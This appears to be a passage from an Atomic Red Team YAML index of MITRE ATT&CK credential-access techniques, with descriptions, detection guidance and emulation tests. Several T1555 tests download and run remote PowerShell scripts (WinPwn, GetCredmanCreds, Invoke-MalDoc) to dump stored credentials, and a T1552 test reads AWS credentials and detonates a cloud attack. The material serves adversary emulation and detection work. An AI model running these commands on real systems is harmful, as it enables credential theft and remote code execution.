      - 'Logon Session: Logon Session Metadata'
      - 'Command: Command Execution'
      - 'File: File Access'
      x_mitre_permissions_required:
      - User
      - root
      x_mitre_system_requirements:
      - Kerberos authentication enabled
      type: attack-pattern
      id: attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a
      created: '2020-02-11T19:12:46.830Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1558
        external_id: T1558
      - source_name: ADSecurity Kerberos Ring Decoder
        description: Sean Metcalf. (2014, September 12). Kerberos, Active Directory‚Äôs
          Secret Decoder Ring. Retrieved February 27, 2020.
        url: https://adsecurity.org/?p=227
      - source_name: Microsoft Klist
        description: Microsoft. (2021, March 3). klist. Retrieved October 14, 2021.
        url: https://docs.microsoft.com/windows-server/administration/windows-commands/klist
      - source_name: MIT ccache
        description: 'Massachusetts Institute of Technology. (n.d.). MIT Kerberos
          Documentation: Credential Cache. Retrieved October 4, 2021.'
        url: https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html
      - source_name: Linux Kerberos Tickets
        description: Trevor Haskell. (2020, April 1). Kerberos Tickets on Linux Red
          Teams. Retrieved October 4, 2021.
        url: https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html
      - source_name: Brining MimiKatz to Unix
        description: Tim Wadhwa-Brown. (2018, November). Where 2 worlds collide Bringing
          Mimikatz et al to UNIX. Retrieved October 13, 2021.
        url: https://labs.portcullis.co.uk/download/eu-18-Wadhwa-Brown-Where-2-worlds-collide-Bringing-Mimikatz-et-al-to-UNIX.pdf
      - source_name: Kekeo
        description: Benjamin Delpy. (n.d.). Kekeo. Retrieved October 4, 2021.
        url: https://github.com/gentilkiwi/kekeo
      - source_name: SpectorOps Bifrost Kerberos macOS 2019
        description: Cody Thomas. (2019, November 14). When Kirbi walks the Bifrost.
          Retrieved October 6, 2021.
        url: https://posts.specterops.io/when-kirbi-walks-the-bifrost-4c727807744f
      - source_name: macOS kerberos framework MIT
        description: Massachusetts Institute of Technology. (2007, October 27). Kerberos
          for Macintosh Preferences Documentation. Retrieved October 6, 2021.
        url: http://web.mit.edu/macdev/KfM/Common/Documentation/preferences.html
      - source_name: ADSecurity Detecting Forged Tickets
        description: Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket
          (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December
          23, 2015.
        url: https://adsecurity.org/?p=1515
      - source_name: Stealthbits Detect PtT 2019
        description: Jeff Warren. (2019, February 19). How to Detect Pass-the-Ticket
          Attacks. Retrieved February 27, 2020.
        url: https://blog.stealthbits.com/detect-pass-the-ticket-attacks
      - source_name: CERT-EU Golden Ticket Protection
        description: Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016,
          April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.
        url: https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf
      - source_name: Microsoft Kerberos Golden Ticket
        description: Microsoft. (2015, March 24). Kerberos Golden Ticket Check (Updated).
          Retrieved February 27, 2020.
        url: https://gallery.technet.microsoft.com/scriptcenter/Kerberos-Golden-Ticket-b4814285
      - source_name: Microsoft Detecting Kerberoasting Feb 2018
        description: Bani, M. (2018, February 23). Detecting Kerberoasting activity
          using Azure Security Center. Retrieved March 23, 2018.
        url: https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/
      - source_name: AdSecurity Cracking Kerberos Dec 2015
        description: Metcalf, S. (2015, December 31). Cracking Kerberos TGS Tickets
          Using Kerberoast ‚Äì Exploiting Kerberos to Compromise the Active Directory
          Domain. Retrieved March 22, 2018.
        url: https://adsecurity.org/?p=2293
      - source_name: Medium Detecting Attempts to Steal Passwords from Memory
        description: French, D. (2018, October 2). Detecting Attempts to Steal Passwords
          from Memory. Retrieved October 11, 2019.
        url: https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-memory-558f16dce4ea
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1555:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--3fc9b85a-2862-4363-a64d-d692e3ffbee0
      type: attack-pattern
      created: '2020-02-11T18:48:28.456Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1555
        url: https://attack.mitre.org/techniques/T1555
      modified: '2022-04-01T18:25:13.952Z'
      name: Credentials from Password Stores
      description: Adversaries may search for common password storage locations to
        obtain user credentials. Passwords are stored in several places on a system,
        depending on the operating system or application holding the credentials.
        There are also specific applications that store passwords to make it easier
        for users manage and maintain. Once credentials are obtained, they can be
        used to perform lateral movement and access restricted information.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: Monitor system calls, file read events, and processes for
        suspicious activity that could indicate searching for a password  or other
        activity related to performing keyword searches (e.g. password, pwd, login,
        store, secure, credentials, etc.) in process memory for credentials. File
        read events should be monitored surrounding known password storage applications.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Command: Command Execution'
      - 'Process: Process Access'
      - 'Process: OS API Execution'
      - 'File: File Access'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - Administrator
      x_mitre_is_subtechnique: false
      identifier: T1555
    atomic_tests:
    - name: Extract Windows Credential Manager via VBA
      auto_generated_guid: 234f9b7c-b53d-4f32-897b-b880a6c9ea7b
      description: |
        This module will extract the credentials found within the Windows credential manager and dump
        them to $env:TEMP\windows-credentials.txt
      supported_platforms:
      - windows
      dependency_executor_name: powershell
      dependencies:
      - description: 'Microsoft Word must be installed

          '
        prereq_command: |
          try {
            New-Object -COMObject "word.Application" | Out-Null
            $process = "winword"
            Stop-Process -Name $process
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft Word manually
          to meet this requirement"

          '
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1555\src\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
        cleanup_command: 'Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction
          Ignore

          '
        name: powershell
    - name: Dump credentials from Windows Credential Manager With PowerShell [windows
        Credentials]
      auto_generated_guid: c89becbe-1758-4e7d-a0f4-97d2188a23e3
      description: This module will extract the credentials from Windows Credential
        Manager
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: "IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1'
          -UseBasicParsing); Get-PasswordVaultCredentials -Force   \n"
    - name: Dump credentials from Windows Credential Manager With PowerShell [web
        Credentials]
      auto_generated_guid: 8fd5a296-6772-4766-9991-ff4e92af7240
      description: This module will extract the credentials from Windows Credential
        Manager
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: 'IEX (IWR ''https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1''
          -UseBasicParsing); Get-CredManCreds -Force

          '
    - name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe
        [Windows Credentials]
      auto_generated_guid: 36753ded-e5c4-4eb5-bc3c-e8fba236878d
      description: This module will enumerate credentials stored in Windows Credentials
        vault of Windows Credential Manager using builtin utility vaultcmd.exe
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: 'vaultcmd /listcreds:"Windows Credentials" /all

          '
    - name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe
        [Web Credentials]
      auto_generated_guid: bc071188-459f-44d5-901a-f8f2625b2d2e
      description: This module will enumerate credentials stored in Web Credentials
        vault of Windows Credential Manager using builtin utility vaultcmd.exe
      supported_platforms:
      - windows
      executor:
        name: powershell
        elevation_required: false
        command: 'vaultcmd /listcreds:"Web Credentials" /all

          '
    - name: WinPwn - Loot local Credentials - lazagne
      auto_generated_guid: '079ee2e9-6f16-47ca-a635-14efcd994118'
      description: "The [LaZagne project](https://github.com/AlessandroZ/LaZagne)
        is an open source application used to retrieve lots of passwords stored on
        a local computer. \nEach software stores its passwords using different techniques
        (plaintext, APIs, custom algorithms, databases, etc.). \nThis tool has been
        developed for the purpose of finding these passwords for the most commonly-used
        software"
      supported_platforms:
      - windows
      executor:
        command: |-
          $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
          iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
          lazagnemodule -consoleoutput -noninteractive
        name: powershell
    - name: WinPwn - Loot local Credentials - Wifi Credentials
      auto_generated_guid: afe369c2-b42e-447f-98a3-fb1f4e2b8552
      description: Loot local Credentials - Wifi Credentials technique via function
        of WinPwn
      supported_platforms:
      - windows
      executor:
        command: "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object
          net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nwificreds
          -consoleoutput -noninteractive  "
        name: powershell
    - name: WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords
      auto_generated_guid: db965264-3117-4bad-b7b7-2523b7856b92
      description: Loot local Credentials - Decrypt Teamviewer Passwords technique
        via function of WinPwn
      supported_platforms:
      - windows
      executor:
        command: "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object
          net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndecryptteamviewer
          -consoleoutput -noninteractive  "
        name: powershell
  T1552:
    technique:
      modified: '2023-04-13T00:29:53.605Z'
      name: Unsecured Credentials
      description: Adversaries may search compromised systems to find and obtain insecurely
        stored credentials. These credentials can be stored and/or misplaced in many
        locations on a system, including plaintext files (e.g. [Bash History](https://attack.mitre.org/techniques/T1552/003)),
        operating system or application-specific repositories (e.g. [Credentials in
        Registry](https://attack.mitre.org/techniques/T1552/002)), or other specialized
        files/artifacts (e.g. [Private Keys](https://attack.mitre.org/techniques/T1552/004)).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_contributors:
      - Austin Clark, @c2defense
      x_mitre_deprecated: false
      x_mitre_detection: |-
        While detecting adversaries accessing credentials may be difficult without knowing they exist in the environment, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [Valid Accounts](https://attack.mitre.org/techniques/T1078) for more information.

        Monitor for suspicious file access activity, specifically indications that a process is reading multiple files in a short amount of time and/or using command-line arguments  indicative of searching for credential material (ex: regex patterns). These may be indicators of automated/scripted credential access behavior.

        Monitoring when the user's <code>.bash_history</code> is read can help alert to suspicious activity. While users do typically rely on their history of commands, they often access this history through other utilities like "history" instead of commands like <code>cat ~/.bash_history</code>.

        Additionally, monitor processes for applications that can be used to query the Registry, such as [Reg](https://attack.mitre.org/software/S0075), and collect command parameters that may indicate credentials are being searched. Correlate activity with related suspicious behavior that may indicate an active intrusion to reduce false positives.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      - Containers
      - Network
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Windows Registry: Windows Registry Key Access'
      - 'Command: Command Execution'
      - 'User Account: User Account Authentication'
      - 'Application Log: Application Log Content'
      - 'File: File Access'
      - 'Process: Process Creation'
      type: attack-pattern
      id: attack-pattern--435dfb86-2697-4867-85b5-2fef496c0517
      created: '2020-02-04T12:47:23.631Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1552
        external_id: T1552
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1552
    atomic_tests:
    - name: AWS - Retrieve EC2 Password Data using stratus
      auto_generated_guid: a21118de-b11e-4ebd-b655-42f11142df0c
      description: 'This atomic runs an API call GetPasswordData from a role that
        does not have permission to do so. This simulates an attacker attempting to
        retrieve RDP passwords on a high number of Windows EC2 instances. This atomic
        test leverages a tool called stratus-red-team built by DataDog (https://github.com/DataDog/stratus-red-team).
        Stratus Red Team is a self-contained binary. You can use it to easily detonate
        offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.ec2-get-password-data/

        '
      supported_platforms:
      - linux
      - macos
      input_arguments:
        stratus_path:
          description: Path of stratus binary
          type: path
          default: "$PathToAtomicsFolder/T1552/src"
        aws_region:
          description: AWS region to detonate
          type: string
          default: us-west-2
      dependency_executor_name: sh
      dependencies:
      - description: 'Stratus binary must be present at the (#{stratus_path}/stratus)

          '
        prereq_command: 'if [ -f #{stratus_path}/stratus ]; then exit 0; else exit
          1; fi;

          '
        get_prereq_command: "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl
          -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
          | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget
          -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar
          -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif
          [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl
          -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest
          | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget
          -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar
          -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
      - description: 'Check if ~/.aws/credentials file has a default stanza is configured

          '
        prereq_command: 'cat ~/.aws/credentials | grep "default"

          '
        get_prereq_command: 'echo Please install the aws-cli and configure your AWS
          defult profile using: aws configure

          '
      executor:
        command: "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting
          warmup\"\n./stratus warmup aws.credential-access.ec2-get-password-data\necho
          \"starting detonate\"\n./stratus detonate aws.credential-access.ec2-get-password-data
          --force\n"
        cleanup_command: |
          export AWS_REGION=#{aws_region}

          echo "Cleanup detonation"
          cd #{stratus_path}
          ./stratus cleanup --all
          rm -rf stratus*
        name: sh
        elevation_required: false
  T1139:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--44dca04b-808d-46ca-b25f-d85236d4b9f8
      type: attack-pattern
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1139
        url: https://attack.mitre.org/techniques/T1139
      - url: http://www.slideshare.net/StephanBorosh/external-to-da-the-os-x-way
        description: Alex Rymdeko-Harvey, Steve Borosh. (2016, May 14). External to
          DA, the OS X Way. Retrieved July 3, 2017.
        source_name: External to DA, the OS X Way
      modified: '2020-02-04T13:03:03.354Z'
      name: Bash History
      description: 'Bash keeps track of the commands users type on the command-line
        with the "history" utility. Once a user logs out, the history is flushed to
        the user‚Äôs <code>.bash_history</code> file. For each user, this file resides
        at the same location: <code>~/.bash_history</code>. Typically, this file keeps
        track of the user‚Äôs last 500 commands. Users often type usernames and passwords
        on the command-line as parameters to programs, which then get saved to this
        file when they log out. Attackers can abuse this by looking through the file
        for potential credentials. (Citation: External to DA, the OS X Way)'
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: Monitoring when the user's <code>.bash_history</code> is
        read can help alert to suspicious activity. While users do typically rely
        on their history of commands, they often access this history through other
        utilities like "history" instead of commands like <code>cat ~/.bash_history</code>.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1503:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ryan Benson, Exabeam
      - Barry Shteiman, Exabeam
      - Sylvain Gil, Exabeam
      - RedHuntLabs, @redhuntlabs
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--4579d9c9-d5b9-45e0-9848-0104637b579f
      type: attack-pattern
      created: '2019-06-17T19:34:51.855Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1503
        url: https://attack.mitre.org/techniques/T1503
      - source_name: Talos Olympic Destroyer 2018
        url: https://blog.talosintelligence.com/2018/02/olympic-destroyer.html
        description: Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer
          Takes Aim At Winter Olympics. Retrieved March 14, 2019.
      - source_name: Microsoft CryptUnprotectData April 2018
        url: https://docs.microsoft.com/en-us/windows/desktop/api/dpapi/nf-dpapi-cryptunprotectdata
        description: Microsoft. (2018, April 12). CryptUnprotectData function. Retrieved
          June 18, 2019.
      - source_name: Proofpoint Vega Credential Stealer May 2018
        url: https://www.proofpoint.com/us/threat-insight/post/new-vega-stealer-shines-brightly-targeted-campaign
        description: Proofpoint. (2018, May 10). New Vega Stealer shines brightly
          in targeted campaign . Retrieved June 18, 2019.
      - source_name: FireEye HawkEye Malware July 2017
        url: https://www.fireeye.com/blog/threat-research/2017/07/hawkeye-malware-distributed-in-phishing-campaign.html
        description: Swapnil Patil, Yogesh Londhe. (2017, July 25). HawkEye Credential
          Theft Malware Distributed in Recent Phishing Campaign. Retrieved June 18,
          2019.
      - source_name: GitHub Mimikittenz July 2016
        url: https://github.com/putterpanda/mimikittenz
        description: Jamieson O'Reilly (putterpanda). (2016, July 4). mimikittenz.
          Retrieved June 20, 2019.
      modified: '2020-11-17T16:03:55.549Z'
      name: Credentials from Web Browsers
      description: "Adversaries may acquire credentials from web browsers by reading
        files specific to the target browser.  (Citation: Talos Olympic Destroyer
        2018) \n\nWeb browsers commonly save credentials such as website usernames
        and passwords so that they do not need to be entered manually in the future.
        Web browsers typically store the credentials in an encrypted format within
        a credential store; however, methods exist to extract plaintext credentials
        from web browsers.\n\nFor example, on Windows systems, encrypted credentials
        may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User
        Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url,
        username_value, password_value FROM logins;</code>. The plaintext password
        can then be obtained by passing the encrypted credentials to the Windows API
        function <code>CryptUnprotectData</code>, which uses the victim‚Äôs cached logon
        credentials as the decryption key. (Citation: Microsoft CryptUnprotectData
        April 2018)\n \nAdversaries have executed similar procedures for common web
        browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential
        Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)\n\nAdversaries
        may also acquire credentials by searching web browser process memory for patterns
        that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter
        acquiring credentials from web browsers, adversaries may attempt to recycle
        the credentials across different systems and/or accounts in order to expand
        access. This can result in significantly furthering an adversary's objective
        in cases where credentials gained from web browsers overlap with privileged
        accounts (e.g. domain administrator)."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: 'Identify web browser files that contain credentials such
        as Google Chrome‚Äôs Login Data database file: <code>AppData\Local\Google\Chrome\User
        Data\Default\Login Data</code>. Monitor file read events of web browser files
        that contain credentials, especially when the reading process is unrelated
        to the subject web browser. Monitor process execution logs to include PowerShell
        Transcription focusing on those that perform a combination of behaviors including
        reading web browser process memory, utilizing regular expressions, and those
        that contain numerous keywords for common web applications (Gmail, Twitter,
        Office365, etc.).'
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1556.007:
    technique:
      modified: '2022-10-21T16:09:38.202Z'
      name: Hybrid Identity
      description: "Adversaries may patch, modify, or otherwise backdoor cloud authentication
        processes that are tied to on-premises user identities in order to bypass
        typical authentication mechanisms, access credentials, and enable persistent
        access to accounts.  \n\nMany organizations maintain hybrid user and device
        identities that are shared between on-premises and cloud-based environments.
        These can be maintained in a number of ways. For example, Azure AD includes
        three options for synchronizing identities between Active Directory and Azure
        AD(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization
        (PHS), in which a privileged on-premises account synchronizes user password
        hashes between Active Directory and Azure AD, allowing authentication to Azure
        AD to take place entirely in the cloud \n* Pass Through Authentication (PTA),
        in which Azure AD authentication attempts are forwarded to an on-premises
        PTA agent, which validates the credentials against Active Directory \n* Active
        Directory Federation Services (AD FS), in which a trust relationship is established
        between Active Directory and Azure AD \n\nAD FS can also be used with other
        SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication
        process to AD FS and receive a token containing the hybrid users‚Äô identity
        and privileges. \n\nBy modifying authentication processes tied to hybrid identities,
        an adversary may be able to establish persistent privileged access to cloud
        resources. For example, adversaries who compromise an on-premises server running
        a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService`
        process that authorizes all attempts to authenticate to Azure AD, as well
        as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation:
        AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary
        may edit the `Microsoft.IdentityServer.Servicehost` configuration file to
        load a malicious DLL that generates authentication tokens for any user with
        any set of claims, thereby bypassing multi-factor authentication and defined
        AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able
        to modify the hybrid identity authentication process from the cloud. For example,
        adversaries who compromise a Global Administrator account in an Azure AD tenant
        may be able to register a new PTA agent via the web console, similarly allowing
        them to harvest credentials and log into the Azure AD environment as any user.(Citation:
        Mandiant Azure AD Backdoors)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_detection: ''
      x_mitre_platforms:
      - Windows
      - Azure AD
      - SaaS
      - Google Workspace
      - Office 365
      - IaaS
      x_mitre_is_subtechnique: true
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '1.0'
      x_mitre_contributors:
      - Praetorian
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'Logon Session: Logon Session Creation'
      - 'File: File Modification'
      - 'Module: Module Load'
      type: attack-pattern
      id: attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f
      created: '2022-09-28T13:29:53.354Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1556/007
        external_id: T1556.007
      - source_name: Azure AD Connect for Read Teamers
        description: Adam Chester. (2019, February 18). Azure AD Connect for Red Teamers.
          Retrieved September 28, 2022.
        url: https://blog.xpnsec.com/azuread-connect-for-redteam/
      - source_name: AADInternals Azure AD On-Prem to Cloud
        description: 'Dr. Nestori Syynimaa. (2020, July 13). Unnoticed sidekick: Getting
          access to cloud as an on-prem admin. Retrieved September 28, 2022.'
        url: https://o365blog.com/post/on-prem_admin/
      - source_name: MagicWeb
        description: 'Microsoft Threat Intelligence Center, Microsoft Detection and
          Response Team, Microsoft 365 Defender Research Team . (2022, August 24).
          MagicWeb: NOBELIUM‚Äôs post-compromise trick to authenticate as anyone. Retrieved
          September 28, 2022.'
        url: https://www.microsoft.com/security/blog/2022/08/24/magicweb-nobeliums-post-compromise-trick-to-authenticate-as-anyone/
      - source_name: Azure AD Hybrid Identity
        description: Microsoft. (2022, August 26). Choose the right authentication
          method for your Azure Active Directory hybrid identity solution. Retrieved
          September 28, 2022.
        url: https://learn.microsoft.com/en-us/azure/active-directory/hybrid/choose-ad-authn
      - source_name: Mandiant Azure AD Backdoors
        description: Mike Burns. (2020, September 30). Detecting Microsoft 365 and
          Azure Active Directory Backdoors. Retrieved September 28, 2022.
        url: https://www.mandiant.com/resources/detecting-microsoft-365-azure-active-directory-backdoors
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1145:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Itzik Kotler, SafeBreach
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe
      type: attack-pattern
      created: '2017-12-14T16:46:06.044Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1145
        url: https://attack.mitre.org/techniques/T1145
      - url: https://en.wikipedia.org/wiki/Public-key_cryptography
        description: Wikipedia. (2017, June 29). Public-key cryptography. Retrieved
          July 5, 2017.
        source_name: Wikipedia Public Key Crypto
      - url: https://kasperskycontenthub.com/wp-content/uploads/sites/43/vlpdfs/unveilingthemask_v1.0.pdf
        description: Kaspersky Labs. (2014, February 11). Unveiling ‚ÄúCareto‚Ä? - The
          Masked APT. Retrieved July 5, 2017.
        source_name: Kaspersky Careto
      - url: https://researchcenter.paloaltonetworks.com/2016/06/unit42-prince-of-persia-game-over/
        description: Bar, T., Conant, S., Efraim, L. (2016, June 28). Prince of Persia
          ‚Äì Game Over. Retrieved July 5, 2017.
        source_name: Palo Alto Prince of Persia
      modified: '2020-02-18T16:51:57.775Z'
      name: Private Keys
      description: |-
        Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures. (Citation: Wikipedia Public Key Crypto)

        Adversaries may gather private keys from compromised systems for use in authenticating to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email. Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:\Users\(username)\.ssh\</code> on Windows.

        Private keys should require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line.

        Adversary tools have been discovered that search compromised systems for file extensions relating to cryptographic keys and certificates. (Citation: Kaspersky Careto) (Citation: Palo Alto Prince of Persia)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: credential-access
      x_mitre_detection: Monitor access to files and directories related to cryptographic
        keys and certificates as a means for potentially detecting access patterns
        that may indicate collection and exfiltration activity. Collect authentication
        logs and look for potentially abnormal activity that may indicate improper
        use of keys or certificates for remote authentication.
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1555.003:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ryan Benson, Exabeam
      - Barry Shteiman, Exabeam
      - Sylvain Gil, Exabeam
      - RedHuntLabs, @redhuntlabs
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--58a3e6aa-4453-4cc8-a51f-4befe80b31a8
      type: attack-pattern
      created: '2020-02-12T18:57:36.041Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1555.003
        url: https://attack.mitre.org/techniques/T1555/003
      - source_name: Talos Olympic Destroyer 2018
        url: https://blog.talosintelligence.com/2018/02/olympic-destroyer.html
        description: Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer
          Takes Aim At Winter Olympics. Retrieved March 14, 2019.
